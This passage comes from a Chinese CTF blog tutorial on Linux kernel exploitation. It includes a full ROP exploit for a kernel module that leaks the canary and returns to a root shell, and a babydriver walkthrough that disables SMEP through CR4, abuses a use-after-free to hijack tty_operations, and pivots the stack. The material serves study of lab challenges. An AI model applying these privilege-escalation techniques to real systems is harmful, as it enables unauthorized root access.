class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Getting the root......\033[0m\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">saveStatus();</span><br><span class="line">fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);<span class="comment">// open the process</span></span><br><span class="line"><span class="keyword">if</span>(!fd)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Cannot open process \&quot;core\&quot;\n\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">get_function_address();<span class="comment">// get addresses of two key function</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base_offset = commit_creds - commit_creds_base;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] KASLR offset: \033[0m%#llx\n&quot;</span>, base_offset);</span><br><span class="line"></span><br><span class="line">change_off(<span class="number">0x40</span>);<span class="comment">// change the offset so that we can get canary later</span></span><br><span class="line">core_read(buffer);<span class="comment">// get canary</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Contents in buffer here:\033[0m\n&quot;</span>);<span class="comment">// print content in buffer</span></span><br><span class="line">print_binary(buffer, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> canary = ((<span class="type">size_t</span>*)&amp;buffer)[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[35m\033[1m[*] The value of canary is the first 8 bytes: \033[0m%#llx\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">memset</span>(ROP, <span class="number">0</span>, <span class="number">800</span>);</span><br><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">ROP[idx++] = canary;</span><br><span class="line">ROP[idx++] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)rise_cred;</span><br><span class="line">ROP[idx++] = swapgs_popfq_ret + base_offset;<span class="comment">// step 1 of returning to user mode: swapgs</span></span><br><span class="line">ROP[idx++] = <span class="number">0</span>;</span><br><span class="line">ROP[idx++] = iretq + base_offset;<span class="comment">// step 2 of returning to user mode: iretq</span></span><br><span class="line"><span class="comment">// after the iretq: return address, user cs, user rflags, user sp, user ss</span></span><br><span class="line">ROP[idx++] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shell;</span><br><span class="line">ROP[idx++] = user_cs;</span><br><span class="line">ROP[idx++] = user_rflags;</span><br><span class="line">ROP[idx++] = user_sp;</span><br><span class="line">ROP[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Our rop chain looks like: \033[0m\n&quot;</span>);</span><br><span class="line">print_binary((<span class="type">char</span>*)ROP, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">write(fd, ROP, <span class="number">0x800</span>);</span><br><span class="line">core_copy_func(<span class="number">0xffffffffffff0100</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Kernel-Use-After-Free-amp-SMAP-x2F-SMEP-bypass"><a href="#Kernel-Use-After-Free-amp-SMAP-x2F-SMEP-bypass" class="headerlink" title="Kernel Use After Free &amp; SMAP&#x2F;SMEP bypass"></a>Kernel Use After Free &amp; SMAP&#x2F;SMEP bypass</h1><p>与用户态类似，内核中也可以利用UAF漏洞，但内存分配的方式完全不同。本漏洞利用使用另一道经典Kernel Pwn入门例题——CISCN-2017 babydriver。同时本题还需要进行SMAP&#x2F;SMEP的绕过，使我们能够ret2usr。<br>在本题中，给的文件系统有bzImage而没有vmlinux，但我们需要使用vmlinux获取到有用的gadget。此时就需要一个已经写好的官方脚本——extract_vmlinux进行vmlinux的提取。这是一个bash文件，只有几十行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Inspired from extract-ikconfig</span></span><br><span class="line"><span class="comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_vmlinux</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># Use readelf to check if it&#x27;s a valid ELF</span></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span></span><br><span class="line"><span class="comment">#       and not just an elf</span></span><br><span class="line">readelf -h <span class="variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$1</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">try_decompress</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span></span><br><span class="line"><span class="comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Try to find the header ($1) and decompress from here</span></span><br><span class="line"><span class="keyword">for</span>pos <span class="keyword">in</span> `<span class="built_in">tr</span> <span class="string">&quot;<span class="variable">$1</span>\n<span class="variable">$2</span>&quot;</span> <span class="string">&quot;\n<span class="variable">$2</span>=&quot;</span> &lt; <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | grep -abo <span class="string">&quot;^<span class="variable">$2</span>&quot;</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">pos=<span class="variable">$&#123;pos%%:*&#125;</span></span><br><span class="line"><span class="built_in">tail</span> -c+<span class="variable">$pos</span> <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | <span class="variable">$3</span> &gt; <span class="variable">$tmp</span> 2&gt; /dev/null</span><br><span class="line">check_vmlinux <span class="variable">$tmp</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check invocation:</span></span><br><span class="line">me=<span class="variable">$&#123;0##*/&#125;</span></span><br><span class="line">img=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span>[ <span class="variable">$#</span> -ne 1 -o ! -s <span class="string">&quot;<span class="variable">$img</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2</span><br><span class="line"><span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare temp files:</span></span><br><span class="line">tmp=$(<span class="built_in">mktemp</span> /tmp/vmlinux-XXX)</span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f <span class="variable">$tmp</span>&quot;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># That didn&#x27;t work, so retry after decompression.</span></span><br><span class="line">try_decompress <span class="string">&#x27;\037\213\010&#x27;</span> xy    gunzip</span><br><span class="line">try_decompress <span class="string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz</span><br><span class="line">try_decompress <span class="string">&#x27;BZh&#x27;</span>          xy    bunzip2</span><br><span class="line">try_decompress <span class="string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma</span><br><span class="line">try_decompress <span class="string">&#x27;\211\114\132&#x27;</span> xy    <span class="string">&#x27;lzop -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="string">&#x27;lz4 -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally check for uncompressed images or objects:</span></span><br><span class="line">check_vmlinux <span class="variable">$img</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bail out:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2</span><br></pre></td></tr></table></figure><p>使用方法：<code>./extract_vmlinux bzImage &gt; vmlinux</code><br>执行后就能够在文件夹中找到vmlinux文件供我们分析。</p><p><strong>Step 1: 读取&#x2F;proc&#x2F;kallsyms获取内核函数地址</strong></p><p>本题与上一题均可以使用cat命令获取到内核函数的地址，但有所不同的是，在上一题，我们读取的是&#x2F;tmp&#x2F;kallsyms，是一个副本而不是&#x2F;proc&#x2F;kallsyms本身。&#x2F;proc&#x2F;kallsyms存放所有内核函数的地址，那为什么出题人还要大费周章地复制一份，为什么不能直接读取呢，&#x2F;proc文件夹又没有设置权限。我们不妨试一下，在上一题直接读取&#x2F;proc&#x2F;kallsyms会打印出什么东西。<br><img src="https://img-blog.csdnimg.cn/c109d13acad24dd5a1fa2698bb77c759.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_15,color_FFFFFF,t_70,g_se,x_16"><br>嗯？为什么这里的地址全都变成0了？仔细查看两道题中init文件的不同之处，我们发现了一丝端倪：<br><img src="https://img-blog.csdnimg.cn/3b3dbd355827494da19b5082f9babf8c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>左边是这道题的init文件，右边是上一道题的init文件，我们发现上一道题对&#x2F;proc做了一些额外的处理。查阅<a href="https://blog.csdn.net/gatieme/article/details/78311841?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165088900816782350946531%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165088900816782350946531&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-78311841.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=/proc/sys/kernel/kptr_restrict&spm=1018.2226.3001.4187">资料</a>后发现，问题出在<code>/proc/sys/kernel/kptr_restrict</code>。当其值为1时，普通用户无法获取到内核的任何地址值。但在本题中并没有这样的命令，因此可以直接读取&#x2F;proc&#x2F;kallsyms文件获取所有内核函数的地址。又因为本题中没有开启KASLR，因此两个关键函数的地址总是不变的，我们使用cat命令获取之后将其直接复制到我们的exp中就可以了。<br><img src="https://img-blog.csdnimg.cn/13e03819a5b64424b4d6aa57d4ff28e7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p><strong>Step 2: 绕过SMAP&#x2F;SMEP</strong></p><p>在boot.sh中很容易就能发现本kernel开启了SMAP&#x2F;SMEP保护。在这种保护下内核无法直接访问用户空间的内容，其中SMEP表示内核无法执行用户空间的代码。我们可以通过修改CR4寄存器的第20位标记将这个保护手动关闭。<br><img src="https://img-blog.csdnimg.cn/ba76e314e8eb43c69eb314798b0b7f79.png"><br>我们使用前面通过脚本获取的vmlinux获取gadget，从中提取到了修改cr4寄存器的gadget地址为0xffffffff81004d80。<br><img src="https://img-blog.csdnimg.cn/2a8534129bd54f498598b74f133b7ce9.png"><br>但在修改cr4之前，我们需要确认一下cr4寄存器中的值到底是什么，毕竟我们要修改的只是SMEP保护，对于其他位不应做任何修改。由于cr4属于控制寄存器，在内核运行过程中一般不会改变。我们查询gadgets.txt看看能不能通过普通的寄存器将cr4的值套出来。<br><img src="https://img-blog.csdnimg.cn/7005e6236a1b416e9ee2e141828757f3.png"><br>这里我们选择将cr4寄存器的值保存到rax中，之后使用gdb进行调试，在此处下断点并跳转到此处即可查看。注意：本题的boot.sh中没有开启-s选项，需要手动修改才能将kernel映射到TCP的1234端口进行调试。</p><p><strong>调试方法：首先打开内核，之后在另一个终端输入<code>gdb vmlinux</code>，输入<code>target remote localhost:1234</code>即可attach到1234端口进行内核调试。</strong><br><img src="https://img-blog.csdnimg.cn/f2320a1dea734546897e96e07b0d6ad3.png"><br>在上图中，我们刚刚引导内核执行了mov rax,cr4指令（直接输入reg cr4是无法显示cr4寄存器的值的），可以看到cr4的值为0x1006f0，其中最高位的1代表SMEP保护开启。因此我们只需要将cr4的值改为0x6f0就能关闭保护。</p><p>这样一来，我们就知道了关闭保护的方法了。关闭保护之后，我们就可以使用上一道题的ROP进行提权，在本题中，ROP应该在最后一步被触发。我们写出ROP链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rop[<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">rop[idx++] = poprdi_ret;<span class="comment">// mov rdi, 6f0h</span></span><br><span class="line">rop[idx++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[idx++] = movcr4rdi_poprbp_ret;<span class="comment">// close SMEP</span></span><br><span class="line">rop[idx++] = <span class="number">0</span>;<span class="comment">// for pop rbp</span></span><br><span class="line">rop[idx++] = rise_cred;</span><br><span class="line">rop[idx++] = swapgs_poprbp_ret;<span class="comment">// ready to return to user mode</span></span><br><span class="line">rop[idx++] = <span class="number">0</span>;</span><br><span class="line">rop[idx++] = iretq;</span><br><span class="line">rop[idx++] = shell;</span><br><span class="line">rop[idx++] = user_cs;</span><br><span class="line">rop[idx++] = user_rflags;</span><br><span class="line">rop[idx++] = user_sp;</span><br><span class="line">rop[idx++] = user_ss;</span><br></pre></td></tr></table></figure><p><strong>Step 3: UAF</strong><br>在ROP确定之后，接下来要思考的就是如何通过UAF触发ROP。</p><p><img src="https://img-blog.csdnimg.cn/488ede4b67be4f60a8983c16f61abe71.png"><br>在模块加载时，会创建一个设备名为babydev，在&#x2F;dev&#x2F;babydev。<br><img src="https://img-blog.csdnimg.cn/b7b80117aaeb476980917ed990f21c65.png"><br>在本题的file_operations结构体中，定义有open函数对应的函数指针为babyopen，在我们打开&#x2F;dev&#x2F;babydev时会执行这个函数。<br><img src="https://img-blog.csdnimg.cn/cbbed073e01b4dde948db6741ea7fadb.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline __alloc_size(<span class="number">3</span>) <span class="type">void</span> *<span class="title function_">kmem_cache_alloc_trace</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s,</span></span><br><span class="line"><span class="params">    <span class="type">gfp_t</span> flags, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *ret = kmem_cache_alloc(s, flags);</span><br><span class="line"></span><br><span class="line">ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是kmem_cache_alloc_trace函数的源码，这是一个内核内存分配的函数，可以看到babyopen中分配的内存大小为0x40，分配得到的内存指针会保存到一个全局变量babydev_struct之中。<br><img src="https://img-blog.csdnimg.cn/a71e425e15624b2ab6a60fc4cfbda452.png"><br>在babyrelease函数中会将我们分配的指针释放。但是由于模块在内存中只会加载一个，当我们同时打开两次此设备时，两设备实际上是相同的，全局变量共用，在一个设备中kfree，但是在另一个设备中仍然可以进行操作，这便是UAF，与用户态pwn相同。我们以可读可写的方式打开此设备，因此open函数的第二个参数为2。（下图为参数说明）<br><img src="https://img-blog.csdnimg.cn/dc7fb4e8310142b2ad8d74dd261c35d6.png"><br>再来看下babyioctl函数。<br><img src="https://img-blog.csdnimg.cn/6b324097cb46482e8a4ace2b6f535699.png"><br>这里的反汇编似乎有点问题，kmalloc的第一个参数应该是size，但是这里肯定不是传入一个未初始化的值。<img src="https://img-blog.csdnimg.cn/be372a278a9e4bb98daf1f192dc85796.png"><br>从汇编可以知道这里传入kmalloc的第一个参数实际上就是我们ioctl函数调用的第三个参数，也即我们可以通过ioctl函数修改这里分配到的内存的大小。</p><p><img src="https://img-blog.csdnimg.cn/1e5c6013c598453db59bea4f720164bc.png"><br>经过实验发现，此处的UAF利用没有问题，能够通过释放的指针修改被释放空间的值。</p><blockquote><p>（摘自<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AKernel-UAF-stack-migitation-SMEP-bypass-ret2usr">资料</a>）<br>在 &#x2F;dev 下有一个伪终端设备 ptmx ，在我们打开这个设备时内核中会创建一个 tty_struct 结构体，与其他类型设备相同，tty驱动设备中同样存在着一个存放着函数指针的结构体 tty_operations<br>那么我们不难想到的是我们可以通过 UAF 劫持 &#x2F;dev&#x2F;ptmx 这个设备的 tty_struct 结构体与其内部的 tty_operations 函数表，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针</p></blockquote><p><img src="https://img-blog.csdnimg.cn/8ac856f765df40aea13f56983d852969.png"><br>可以看到，通过UAF我们可以成功读取到tty_struct的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line"><span class="type">int</span>magic;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line"><span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line"><span class="type">spinlock_t</span> flow_lock;</span><br><span class="line"><span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span><span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line"><span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span><span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span><span class="comment">/* winsize_mutex */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,<span class="comment">/* flow_lock */</span></span><br><span class="line">      flow_stopped:<span class="number">1</span>,</span><br><span class="line">      unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> hw_stopped;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,<span class="comment">/* ctrl_lock */</span></span><br><span class="line">      packet:<span class="number">1</span>,</span><br><span class="line">      unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> receive_room;<span class="comment">/* Bytes free for queue */</span></span><br><span class="line"><span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line"><span class="type">int</span> alt_speed;<span class="comment">/* For magic substitution of 38400 bps */</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line"><span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line"><span class="type">void</span> *disc_data;</span><br><span class="line"><span class="type">void</span> *driver_data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> closing;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line"><span class="type">int</span> write_cnt;</span><br><span class="line"><span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里需要注意哪一个索引才是tty_operations的指针。magic占4字节，kref的声明见下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kref</span> &#123;</span></span><br><span class="line"><span class="type">atomic_t</span> refcount;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">int</span> counter;</span><br><span class="line">&#125; <span class="type">atomic_t</span>;</span><br></pre></td></tr></table></figure><p>因此kref也是占4字节。后面的两个struct指针各占8字节，因此tty_operations应该在结构体中偏移为0x18的位置，也即上图中的0xffffffff81a74f80。我们可以将其修改为我们伪造的tty_operations，将其中write对应的函数指针修改为某一个固定的gadget，再对&#x2F;dev&#x2F;ptmx调用write即可到达我们想要的gadget处，也就能够调试了。</p><p><img src="https://img-blog.csdnimg.cn/7b5c4537c2ff4f8bb5cd13c60d736648.png"><br>发现有rax指向tty_operations。这是我们在内核中唯一可以控制的地址，因此思路是以其为跳板进行栈迁移以触发ROP。这就需要mov rsp, rax的gadget了。<br><img src="https://img-blog.csdnimg.cn/6aac399eea6a45aea34b640be6f712cc.png"><br><img src="https://img-blog.csdnimg.cn/3bb59c3275c74dcfab5a54ceeac4771f.png"><br>发现只有0xffffffff8181bfc5的gadget是可用的，后面的jmp也就相当于是ret了。<br>下面是tty_operations的结构声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>, <span class="title">int</span> 